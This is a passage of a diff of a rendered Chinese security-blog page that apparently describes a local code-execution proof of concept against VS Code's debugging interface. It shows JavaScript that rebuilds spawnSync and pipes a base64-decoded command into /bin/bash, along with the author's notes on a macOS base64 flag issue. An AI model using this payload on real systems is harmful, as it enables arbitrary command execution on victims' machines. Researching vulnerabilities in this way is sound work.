+</span></span><span class="line"><span class="cl">    <span class="c1">// arguments是函数的参数，https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Functions/arguments
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">var</span> <span class="nx">a</span> <span class="o">=</span> <span class="nx">d</span><span class="p">.</span><span class="nx">options</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">c</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">a</span><span class="p">.</span><span class="nx">file</span> <span class="o">=</span> <span class="nx">d</span><span class="p">.</span><span class="nx">file</span><span class="p">,</span> <span class="nx">a</span><span class="p">.</span><span class="nx">args</span> <span class="o">=</span> <span class="nx">d</span><span class="p">.</span><span class="nx">args</span><span class="p">,</span> <span class="nx">a</span><span class="p">.</span><span class="nx">envPairs</span> <span class="o">=</span> <span class="nx">d</span><span class="p">.</span><span class="nx">envPairs</span><span class="p">,</span> <span class="nx">a</span><span class="p">.</span><span class="nx">stdio</span> <span class="o">=</span> <span class="p">[{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">type</span><span class="o">:</span> <span class="s1">&#39;pipe&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">readable</span><span class="o">:</span> <span class="o">!</span><span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">writable</span><span class="o">:</span> <span class="o">!</span><span class="mi">1</span>
+</span></span><span class="line"><span class="cl">        <span class="p">},</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">type</span><span class="o">:</span> <span class="s1">&#39;pipe&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">readable</span><span class="o">:</span> <span class="o">!</span><span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">writable</span><span class="o">:</span> <span class="o">!</span><span class="mi">0</span>
+</span></span><span class="line"><span class="cl">        <span class="p">},</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">type</span><span class="o">:</span> <span class="s1">&#39;pipe&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">readable</span><span class="o">:</span> <span class="o">!</span><span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">writable</span><span class="o">:</span> <span class="o">!</span><span class="mi">0</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}],</span> <span class="nx">a</span><span class="p">.</span><span class="nx">input</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">g</span> <span class="o">=</span> <span class="nx">a</span><span class="p">.</span><span class="nx">stdio</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">util</span><span class="p">.</span><span class="nx">_extend</span><span class="p">({},</span> <span class="nx">a</span><span class="p">.</span><span class="nx">stdio</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">g</span><span class="p">.</span><span class="nx">input</span> <span class="o">=</span> <span class="nx">a</span><span class="p">.</span><span class="nx">input</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="nx">c</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">c</span> <span class="o">&lt;</span> <span class="nx">a</span><span class="p">.</span><span class="nx">stdio</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">c</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">e</span> <span class="o">=</span> <span class="nx">a</span><span class="p">.</span><span class="nx">stdio</span><span class="p">[</span><span class="nx">c</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nx">a</span><span class="p">.</span><span class="nx">stdio</span><span class="p">[</span><span class="nx">c</span><span class="p">].</span><span class="nx">input</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">e</span> <span class="o">!=</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="kd">var</span> <span class="nx">f</span> <span class="o">=</span> <span class="nx">a</span><span class="p">.</span><span class="nx">stdio</span><span class="p">[</span><span class="nx">c</span><span class="p">]</span> <span class="o">=</span> <span class="nx">util</span><span class="p">.</span><span class="nx">_extend</span><span class="p">({},</span> <span class="nx">a</span><span class="p">.</span><span class="nx">stdio</span><span class="p">[</span><span class="nx">c</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">isUint8Array</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="o">?</span> <span class="nx">f</span><span class="p">.</span><span class="nx">input</span> <span class="o">=</span> <span class="nx">e</span> <span class="o">:</span> <span class="nx">f</span><span class="p">.</span><span class="nx">input</span> <span class="o">=</span> <span class="nx">Buffer</span><span class="p">.</span><span class="nx">from</span><span class="p">(</span><span class="nx">e</span><span class="p">,</span> <span class="nx">a</span><span class="p">.</span><span class="nx">encoding</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">b</span> <span class="o">=</span> <span class="nx">spawn_sync</span><span class="p">.</span><span class="nx">spawn</span><span class="p">(</span><span class="nx">a</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">b</span><span class="p">.</span><span class="nx">output</span> <span class="o">&amp;&amp;</span> <span class="nx">a</span><span class="p">.</span><span class="nx">encoding</span> <span class="o">&amp;&amp;</span> <span class="nx">a</span><span class="p">.</span><span class="nx">encoding</span> <span class="o">!==</span> <span class="s1">&#39;buffer&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="nx">c</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">c</span> <span class="o">&lt;</span> <span class="nx">b</span><span class="p">.</span><span class="nx">output</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">c</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">b</span><span class="p">.</span><span class="nx">output</span><span class="p">[</span><span class="nx">c</span><span class="p">])</span> <span class="k">continue</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">b</span><span class="p">.</span><span class="nx">output</span><span class="p">[</span><span class="nx">c</span><span class="p">]</span> <span class="o">=</span> <span class="nx">b</span><span class="p">.</span><span class="nx">output</span><span class="p">[</span><span class="nx">c</span><span class="p">].</span><span class="nx">toString</span><span class="p">(</span><span class="nx">a</span><span class="p">.</span><span class="nx">encoding</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">b</span><span class="p">.</span><span class="nx">stdout</span> <span class="o">=</span> <span class="nx">b</span><span class="p">.</span><span class="nx">output</span> <span class="o">&amp;&amp;</span> <span class="nx">b</span><span class="p">.</span><span class="nx">output</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nx">b</span><span class="p">.</span><span class="nx">stderr</span> <span class="o">=</span> <span class="nx">b</span><span class="p">.</span><span class="nx">output</span> <span class="o">&amp;&amp;</span> <span class="nx">b</span><span class="p">.</span><span class="nx">output</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nx">b</span><span class="p">.</span><span class="nx">error</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">b</span><span class="p">.</span><span class="nx">error</span> <span class="o">=</span> <span class="nx">b</span><span class="p">.</span><span class="nx">error</span> <span class="o">+</span> <span class="s1">&#39;spawnSync &#39;</span> <span class="o">+</span> <span class="nx">d</span><span class="p">.</span><span class="nx">file</span><span class="p">,</span> <span class="nx">b</span><span class="p">.</span><span class="nx">error</span><span class="p">.</span><span class="nx">path</span> <span class="o">=</span> <span class="nx">d</span><span class="p">.</span><span class="nx">file</span><span class="p">,</span> <span class="nx">b</span><span class="p">.</span><span class="nx">error</span><span class="p">.</span><span class="nx">spawnargs</span> <span class="o">=</span> <span class="nx">d</span><span class="p">.</span><span class="nx">args</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">1</span><span class="p">)),</span> <span class="nx">b</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// 加的辅助调试内容
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">function</span> <span class="nx">base64</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">Buffer</span><span class="p">.</span><span class="nx">from</span><span class="p">(</span><span class="nx">data</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="s1">&#39;base64&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">COMMAND</span> <span class="o">=</span> <span class="nx">process</span><span class="p">.</span><span class="nx">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">COMMAND_B64</span> <span class="o">=</span> <span class="nx">base64</span><span class="p">(</span><span class="nx">COMMAND</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">//id=4
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">spawnSync</span><span class="p">(</span><span class="s1">&#39;/bin/bash&#39;</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;-c&#39;</span><span class="p">,</span> <span class="sb">`echo </span><span class="si">${</span><span class="nx">COMMAND_B64</span><span class="si">}</span><span class="sb"> | base64 -d | /bin/bash`</span><span class="p">])</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>id为2和3的表达式中定义了函数<code>spawnSync</code>，其中处理了诸如环境变量，输入输出这些细节。id为4的表达式中调用spawnSync来执行终端中传入的命令。</p>
 <p>可以看到spawnSync函数返回了执行结果的stdout以及stderr，于是我修改了poc，把执行结果放入一个变量中，通过前面的文档可以知道，这种远程执行是有”副作用“的，所以在Chrome中的调试界面应该能打印这个变量，就可以看到报错信息。</p>
@@ -580,7 +574,7 @@ cat /tmp/a
 <p>原来是mac上base64工具的参数和linux上的不太一样，🤦‍♀️。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -597,22 +591,22 @@ cat /tmp/a
 </span><span class="lnt">15
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-sh" data-lang="sh">$ base64 --help
-Usage:	base64 <span class="o">[</span>-hvD<span class="o">]</span> <span class="o">[</span>-b num<span class="o">]</span> <span class="o">[</span>-i in_file<span class="o">]</span> <span class="o">[</span>-o out_file<span class="o">]</span>
-  -h, --help     display this message
-  -D, --decode   decodes input
-  -b, --break    <span class="nb">break</span> encoded string into num character lines
-  -i, --input    input file <span class="o">(</span>default: <span class="s2">&#34;-&#34;</span> <span class="k">for</span> stdin<span class="o">)</span>
-  -o, --output   output file <span class="o">(</span>default: <span class="s2">&#34;-&#34;</span> <span class="k">for</span> stdout<span class="o">)</span>
-  
-root@kali:~# base64 --help
-Usage: base64 <span class="o">[</span>OPTION<span class="o">]</span>... <span class="o">[</span>FILE<span class="o">]</span>
-Base64 encode or decode FILE, or standard input, to standard output.
-With no FILE, or when FILE is -, <span class="nb">read</span> standard input.
-Mandatory arguments to long options are mandatory <span class="k">for</span> short options too.
-  -d, --decode          decode data
-  ........
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ base64 --help
+</span></span><span class="line"><span class="cl">Usage:	base64 <span class="o">[</span>-hvD<span class="o">]</span> <span class="o">[</span>-b num<span class="o">]</span> <span class="o">[</span>-i in_file<span class="o">]</span> <span class="o">[</span>-o out_file<span class="o">]</span>
+</span></span><span class="line"><span class="cl">  -h, --help     display this message
+</span></span><span class="line"><span class="cl">  -D, --decode   decodes input
+</span></span><span class="line"><span class="cl">  -b, --break    <span class="nb">break</span> encoded string into num character lines
+</span></span><span class="line"><span class="cl">  -i, --input    input file <span class="o">(</span>default: <span class="s2">&#34;-&#34;</span> <span class="k">for</span> stdin<span class="o">)</span>
+</span></span><span class="line"><span class="cl">  -o, --output   output file <span class="o">(</span>default: <span class="s2">&#34;-&#34;</span> <span class="k">for</span> stdout<span class="o">)</span>
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">root@kali:~# base64 --help
+</span></span><span class="line"><span class="cl">Usage: base64 <span class="o">[</span>OPTION<span class="o">]</span>... <span class="o">[</span>FILE<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Base64 encode or decode FILE, or standard input, to standard output.
+</span></span><span class="line"><span class="cl">With no FILE, or when FILE is -, <span class="nb">read</span> standard input.
+</span></span><span class="line"><span class="cl">Mandatory arguments to long options are mandatory <span class="k">for</span> short options too.
+</span></span><span class="line"><span class="cl">  -d, --decode          decode data
+</span></span><span class="line"><span class="cl">  ........
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>把poc中的<code>base64 -d</code>换成<code>base64 -D</code>之后执行成功了。</p>
 <p><img src="/img/vscode-local-execute/image-20191105140552406.png" alt="image-20191105140552406"></p>
@@ -677,21 +671,6 @@ Mandatory arguments to long options are mandatory <span class="k">for</span> sho
 
   
 
-<script src="https://giscus.app/client.js"
-        data-repo="b1tg/b1tg.github.io"
-        data-repo-id="MDEwOlJlcG9zaXRvcnkyMjIxMDgzNDI="
-        data-category="Discuss"
-        data-category-id="DIC_kwDODT0ats4CQAsT"
-        data-mapping="title"
-        data-reactions-enabled="1"
-        data-emit-metadata="0"
-        data-input-position="bottom"
-        data-theme="light"
-        data-lang="en"
-        crossorigin="anonymous"
-        async>
-</script>
-
       </div>
     </main>
 
@@ -733,7 +712,7 @@ Mandatory arguments to long options are mandatory <span class="k">for</span> sho
 
 
 
-<script type="text/javascript" src="/js/main.min.c12618f9a600c40bd024996677e951e64d3487006775aeb22e200c990006c5c7.js"></script>
+<script type="text/javascript" src="/js/main.min.4ae89da218555efa0e7093a20b92017d2e1202b66fff9fc2edf4cb8d44b44c6e.js"></script>
 
 
 
